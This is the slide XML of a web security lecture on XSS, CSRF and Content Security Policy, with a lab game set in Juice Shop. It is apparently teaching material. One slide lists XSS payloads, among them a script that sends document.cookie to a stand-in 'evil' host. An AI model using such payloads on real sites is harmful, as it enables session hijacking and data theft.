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411480"/>
            <a:ext cx="187452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566928"/>
            <a:ext cx="1563624" cy="62179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5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XSS &amp; Client-Side Risks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browser security model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XSS: reflected / stored / DOM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CSRF + SameSite cookies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Security Policy (CSP)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Game: XSS Golf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Recap — Week 4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= data interpreted as code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Parameterized queries fix SQLi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idea returns today — in the browser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 security model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Same-Origin Policy (SOP): scripts only read data from same origin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 = scheme + host + port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Cookies, DOM, storage scoped per origin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XSS = injection into the page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1E2B45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3258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 JavaScript runs in the victim's browser, in the site's origin.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313432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423160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Steal cookies/sessions, keylog, rewrite the page, pivot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to OWASP A05:2025 Injection (output side)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1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flavors of XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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Type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Where the payload lives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Reflected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in the request, echoed back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Stored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saved server-side, served to others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DOM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client-side JS writes untrusted data to the DOM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sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 3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payloads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042416"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5263"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A1020"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1E2B45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&lt;script&gt;fetch('//evil/'+document.cookie)&lt;/script&gt;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&lt;img src=x onerror=alert(1)&gt;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"&gt;&lt;svg onload=alert(1)&gt;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532888"/>
            <a:ext cx="8229600" cy="585216"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12500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642616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matters: HTML body vs attribute vs JS vs URL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1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CSRF — riding the user's session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auto-sends cookies → attacker forges a state-changing request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Defenses: anti-CSRF tokens, SameSite cookies, check Origin/Referer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Real-world: British Airways (2018)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Attackers injected malicious JS (Magecart) into BA's site/app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skimmed credit-card details as users typed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400,000 customers affected; £183M ICO fine (later reduced)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6974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1E2B45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26974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 injection = real money + real fines.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1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CWE mapping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CWE-79 — Cross-site scripting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CWE-352 — CSRF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CWE-1021 — improper restriction of rendered UI (clickjacking)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Defenses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encoding per context (HTML/attr/JS/URL)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auto-escaping (don't bypass with innerHTML/dangerouslySetInnerHTML)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Security Policy — block inline/3rd-party scripts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HttpOnly + SameSite cookies; anti-CSRF tokens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⛳ Game — XSS Golf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Craft the shortest payload that pops alert(1) / steals a cookie in Juice Shop.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96596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31520" y="207568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Leaderboard by character count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2: deploy a CSP + escaping that blocks *every* submitted payload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Bonus: break a classmate's CSP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steps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3258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6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="50292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51560" y="13258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reflected + stored + DOM XSS in Juice Shop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02920" y="17830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051560" y="17830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 cookie theft (sandbox)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02920" y="22402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2" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="50292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051560" y="22402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output encoding + a strict CSP header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02920" y="26974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1051560" y="26974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 CSRF and its defense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XSS type with payload + context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CSP + escaping that blocks them (show before/after)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note: why SameSite + tokens stop CSRF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XSS is injection on the output side — encode for the context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CSP is defense-in-depth, not a substitute for encoding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SameSite cookies kill most CSRF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5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Authentication, sessions &amp; access control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5</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Nutthakorn Chalaemwongwan</dc:creator>
  <cp:lastModifiedBy>Nutthakorn Chalaemwongwan</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-06-28T03:45:07Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-28T03:45:07Z</dcterms:modified>
</cp:coreProperties>
</file>